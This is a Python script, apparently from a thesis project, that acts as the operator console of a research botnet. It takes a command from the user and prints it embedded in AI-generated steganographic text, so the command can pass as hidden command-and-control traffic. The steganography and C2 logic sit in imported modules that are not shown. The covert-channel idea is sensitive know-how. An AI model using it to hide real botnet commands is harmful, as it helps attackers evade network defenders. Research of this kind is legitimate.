appHeader = """
#####################################################################
### ____  _  _   ___   __     ____   __  ____                     ###
###(  _ \( \/ ) / __) / _\   (  _ \ /  \(_  _)                    ###
### ) _ (/ \/ \( (_ \/    \   ) _ ((  O ) )(                      ###
###(____/\_)(_/ \___/\_/\_/  (____/ \__/ (__)                     ###
###---------------------------------------------------------------###
### A bot for researching hidden botnet communication.            ###
### By using generative AI for creating steganographic stego-text ###
###---------------------------------------------------------------###########################################################
### I, Arnoud Stolk, explicitly declare that I bear no responsibility for the application or misapplication of this project.#
### This project has been developed solely for research purposes.                                                           #
### The intention behind sharing this source code online is to supplement and support my thesis.                            #
### Upon completion and evaluation, the thesis will be published on the associated GitHub page.                             #
### For further information or inquiries, please visit https://github.com/arnoudx6/bmga.                                    #
#############################################################################################################################
"""

#First print a the cool header also warning the user that I bear no responsiblilty for the abuse
print(appHeader)

#Import standard modules
import time

#Import custom modules
import shared_modules.c2 as c2Module
import shared_modules.stego as stegoModule

#Initialize script variables
keepBotmasterActive = True

while keepBotmasterActive:
    

    #Ask for an instruction to send
    stegoAlgorithm = input("Stego Algorithm:") 
    embeddedText = input("Command to send: ")
    
    #Call the stego library and embed the embedded-text in a stego-text
    success, stegoText = stegoModule.embedEmbeddedTextInStegoText(embeddedText=embeddedText, stegoAlgorithm=stegoAlgorithm, stegoKey="blabla")

    if not success or not stegoText:
        print("Error while embedding data")
        continue #<-- Go to the next loop itteration



    print(stegoText)
